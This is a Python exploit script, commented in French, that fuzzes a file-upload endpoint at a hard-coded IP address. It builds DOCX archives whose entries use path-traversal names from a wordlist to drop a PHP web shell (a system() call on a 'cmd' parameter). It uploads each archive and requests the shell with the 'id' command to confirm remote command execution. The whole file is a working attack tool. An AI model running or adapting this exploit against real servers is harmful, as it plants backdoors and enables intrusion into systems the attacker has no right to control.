import os
import zipfile
import requests
import tempfile
import time

# Config
target_upload_url = "http://163.172.67.183/"
target_shell_url = "http://163.172.67.183/shell.php"
path_to_wordlist = r"wordlists\dirTraversal.txt"  # Ton fichier fourni

output_dir = tempfile.mkdtemp()
webshell_content = "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>"

def generate_docx_with_webshell(docx_path, traversal_path):
    content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''

    rels = '''<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''

    document_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>Path Traversal Fuzzing</w:t></w:r></w:p>
  </w:body>
</w:document>'''

    app_xml = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties"
            xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">
  <Template>Normal.dotm</Template>
  <TotalTime>1</TotalTime>
  <Pages>1</Pages>
  <Words>1</Words>
  <Characters>10</Characters>
</Properties>'''

    with zipfile.ZipFile(docx_path, "w", zipfile.ZIP_DEFLATED) as docx:
        docx.writestr("[Content_Types].xml", content_types)
        docx.writestr("_rels/.rels", rels)
        docx.writestr("word/document.xml", document_xml)
        docx.writestr("docProps/app.xml", app_xml)
        # Ecrire le webshell au chemin traversal
        path_shell = traversal_path.replace("{FILE}", "shell.php")
        docx.writestr(path_shell, webshell_content)

def upload_docx(docx_path):
    with open(docx_path, "rb") as f:
        files = {'file': ("exploit.docx", f, "application/vnd.openxmlformats-officedocument.wordprocessingml.document")}
        response = requests.post(target_upload_url, files=files)
    return response.status_code

def check_shell():
    try:
        r = requests.get(target_shell_url + "?cmd=id", timeout=5)
        if r.status_code == 200 and "uid=" in r.text:
            print("[+] Shell accessible ! Commande 'id' exécutée :")
            print(r.text)
            return True
        else:
            print("[-] Shell non accessible (status", r.status_code, ")")
            return False
    except Exception as e:
        print("[-] Exception:", e)
        return False

def main():
    if not os.path.exists(path_to_wordlist):
        print(f"Wordlist {path_to_wordlist} introuvable.")
        return

    with open(path_to_wordlist, "r") as f:
        paths = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    print(f"[*] {len(paths)} chemins de Path Traversal chargés.")

    for idx, traversal_path in enumerate(paths):
        print(f"[*] Tentative {idx+1}/{len(paths)} : {traversal_path}")

        docx_path = os.path.join(output_dir, f"payload_{idx}.docx")
        
        # GÉNÉRATION SEULE
        generate_docx_with_webshell(docx_path, traversal_path)

        # ATTENDRE un tout petit moment pour s'assurer que le fichier est bien créé
        time.sleep(0.2)

        # UPLOAD SÉPARÉ
        try:
            upload_status = upload_docx(docx_path)
            print(f"[*] Upload status : {upload_status}")
        except PermissionError as e:
            print(f"[!] Erreur PermissionError sur {docx_path} : {e}")
            continue

        print("[*] Pause 5s pour extraction serveur...")
        time.sleep(5)

        if check_shell():
            print(f"[!!!] Succès avec le chemin : {traversal_path}")
            break
        else:
            print("[*] Pas de shell accessible, on continue...\n")


if __name__ == "__main__":
    main()
